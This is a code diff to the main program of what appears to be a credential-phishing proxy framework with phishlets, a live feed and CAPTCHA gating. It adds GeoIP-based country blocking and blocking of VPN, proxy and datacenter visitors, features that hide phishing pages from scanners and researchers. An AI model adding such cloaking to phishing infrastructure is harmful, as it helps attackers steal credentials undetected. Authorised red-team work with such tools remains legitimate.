@@ -28,6 +28,9 @@ var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
 var feed_enabled = flag.Bool("feed", false, "Enable live feed (requires separate evilfeed process on port 1337)")
 var turnstile = flag.String("turnstile", "", "Cloudflare Turnstile sitekey:secretkey to enable CAPTCHA challenge")
+var geoip_db = flag.String("geoip-db", "", "Path to directory containing GeoLite2-City.mmdb (download from https://dev.maxmind.com/geoip/geolite2-free-geolocation-data)")
+var block_vpn = flag.Bool("block-vpn", false, "Block visitors connecting from VPNs, proxies, or datacenters")
+var block_countries = flag.String("block-countries", "", "Comma-separated list of country ISO codes to block (e.g., RU,CN,IR,KP)")
 
 // Dashboard flags
 var dashboard_addr = flag.String("dashboard", "0.0.0.0:5000", "Dashboard listen address (set empty to disable)")
@@ -142,6 +145,38 @@ func main() {
 	if err != nil {
 		log.Error("blacklist: %s", err)
 		return
+	}
+
+	// Initialize GeoIP database for country tracking, VPN detection, and country blocking
+	var geoIP *core.GeoIPDatabase
+	geoIPDir := *geoip_db
+	if geoIPDir == "" {
+		geoIPDir = filepath.Join(*cfg_dir, "GeoIP")
+		os.MkdirAll(geoIPDir, 0700)
+	}
+	geoIP = core.NewGeoIPDatabase(geoIPDir)
+	if geoIP != nil {
+		log.Info("geoip: GeoIP initialized — country tracking active")
+		cfg.SetGeoIP(geoIP)
+		cfg.SetBlockVPN(*block_vpn)
+
+		// Parse blocked countries list
+		if *block_countries != "" {
+			parts := strings.Split(*block_countries, ",")
+			var cleaned []string
+			for _, p := range parts {
+				c := strings.ToUpper(strings.TrimSpace(p))
+				if len(c) == 2 || len(c) == 3 {
+					cleaned = append(cleaned, c)
+				}
+			}
+			if len(cleaned) > 0 {
+				cfg.SetBlockedCountries(cleaned)
+				log.Info("geoip: blocking visitors from countries: %s", strings.Join(cleaned, ", "))
+			}
+		}
+	} else {
+		log.Info("geoip: not available — download GeoLite2 databases from https://dev.maxmind.com")
 	}
 
 	files, err := os.ReadDir(phishlets_path)
